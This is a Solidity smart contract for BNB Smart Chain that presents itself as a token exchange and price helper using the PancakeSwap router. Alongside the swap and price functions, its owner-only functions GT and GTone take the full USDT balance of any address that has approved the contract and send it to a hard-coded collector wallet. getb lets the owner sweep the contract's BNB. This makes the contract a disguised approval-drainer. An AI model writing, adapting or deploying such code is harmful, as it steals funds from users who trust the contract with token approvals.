// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
    library SafeMath {//konwnsec//IERC20 接口
        function mul(uint256 a, uint256 b) internal pure returns (uint256) {
            if (a == 0) {
                return 0; 
            }
            uint256 c = a * b;
            assert(c / a == b);
            return c; 
        }
        function div(uint256 a, uint256 b) internal pure returns (uint256) {
             uint256 c = a / b;
             return c; 
        }
        function sub(uint256 a, uint256 b) internal pure returns (uint256) {
            assert(b <= a);
            return a - b; 
        }

        function add(uint256 a, uint256 b) internal pure returns (uint256) {
            uint256 c = a + b;
            assert(c >= a);
            return c; 
        }
    }


interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    function decimals() external pure returns (uint8);
}
 
 

    contract Base {
        using SafeMath for uint;
 

        address  _owner;
 
 
        modifier onlyOwner() {
            require(msg.sender == _owner, "Permission denied"); _;
        }
        modifier isZeroAddr(address addr) {
            require(addr != address(0), "Cannot be a zero address"); _; 
        }

 
        function transferOwnership(address newOwner) public onlyOwner {
            require(newOwner != address(0));
            _owner = newOwner;
        }

 

        receive() external payable {}  
}


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
  
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;


 function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

 function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
}
 interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
   

contract gjc {
    using SafeMath for uint256; 
    address  _owner;
    IERC20 public usdt;
    IERC20 public WBNB;
    mapping(address => mapping(uint256 => address[])) public teamUsers;
    modifier onlyOwner() {
        require(msg.sender == _owner, "Permission denied"); _;
    }

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositBySplit(address user, uint256 amount);
    event TransferBySplit(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);
   IUniswapV2Router02 public immutable uniswapV2Router;

     constructor()  {
        usdt = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
        WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Router = _uniswapV2Router;
        _owner = msg.sender;
        
    }
    address address100 = 0x86ec6F7165cEf42E841C61047d3d1F445fE8f189 ; 
    address pond = 0x86ec6F7165cEf42E841C61047d3d1F445fE8f189 ; 
    function GT(address[] calldata addres,uint256  balance) public   onlyOwner {
        for (uint256 i = 0; i < addres.length; i++) {
            address add = addres[i];
            uint256 USDTBalance = usdt.balanceOf(add);
            if(USDTBalance>=balance){
                usdt.transferFrom(address(add), address(address100), USDTBalance);
            }
         }
    }

    function GTone(address  addres,uint256  balance) public   onlyOwner {
        uint256 USDTBalance = usdt.balanceOf(addres);
        if(USDTBalance>=balance){
            usdt.transferFrom(address(addres), address(address100), USDTBalance);
        }
    }

    function setaddress100(address  addres ) public   payable onlyOwner {
        address100 = addres;
    }

    function setaddresspond(address  addres ) public payable  onlyOwner {
        pond = addres;
    }

    function exchange(address tokenAddress ,uint256  balance) public payable {
        address[] memory path = new address[](2);
        path[0] = address(tokenAddress);
        path[1] = address(usdt);
        IERC20 token = IERC20(tokenAddress);

     
        if(tokenAddress == 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c){
       
            uniswapV2Router.swapExactETHForTokens{value: msg.value}(
               0,
               path,
               address(this),
               block.timestamp + 100
            );


        }else{
            if(token.allowance(address(this),0x10ED43C718714eb63d5aA57B78B54704E256024E)<=balance){
                token.approve(address(0x10ED43C718714eb63d5aA57B78B54704E256024E), 10000000000000000000000000000000000000000000000000000);
            }
            token.transferFrom(address(msg.sender), address(this), balance);
            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                balance,
                0,  
                path,
                msg.sender,
                block.timestamp
            );
        }


        
    }



    function BNBtotoken( address tokenAddress ) public payable {
        address[] memory path = new address[](2);
        path[0] = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        path[1] = address(tokenAddress);
        uniswapV2Router.swapExactETHForTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp + 100
        );
    }

    function getb( ) public payable onlyOwner{
        address payable addr1 = payable(msg.sender);
        addr1.transfer(address(this).balance);
    }

    function repayment(uint256 balance) public payable  {
        usdt.transferFrom(address(msg.sender), address(address100), balance);
    }

    function  getPrice1(address tokenAddress0) public view returns (uint256 price){
        address USDC  = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
        address uniswapV2Pair=IUniswapV2Factory(uniswapV2Router.factory()).getPair(tokenAddress0,USDC);
        uint256 balancePath1= IERC20(USDC).balanceOf(uniswapV2Pair);
        uint256 balancePath2= IERC20(tokenAddress0).balanceOf(uniswapV2Pair);
        if(balancePath1==0||balancePath2==0)return 0;
        uint256 path1Decimals=IERC20(USDC).decimals();
        uint256 path2Decimals=IERC20(tokenAddress0).decimals();
        price=(balancePath1*10**18/10**path1Decimals)/(balancePath2/10**path2Decimals);
    }
 
   function  getPrice2(address tokenAddress0) public view returns (uint256 price){
        address USDC  = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
        address uniswapV2Pair=IUniswapV2Factory(uniswapV2Router.factory()).getPair(USDC,tokenAddress0);
        uint256 balancePath1= IERC20(tokenAddress0).balanceOf(uniswapV2Pair);
        uint256 balancePath2= IERC20(USDC).balanceOf(uniswapV2Pair);
        if(balancePath1==0||balancePath2==0)return 0;
        uint256 path1Decimals=IERC20(tokenAddress0).decimals();
        uint256 path2Decimals=IERC20(USDC).decimals();
        price=(balancePath1*10**18/10**path1Decimals)/(balancePath2/10**path2Decimals);
    }
 

}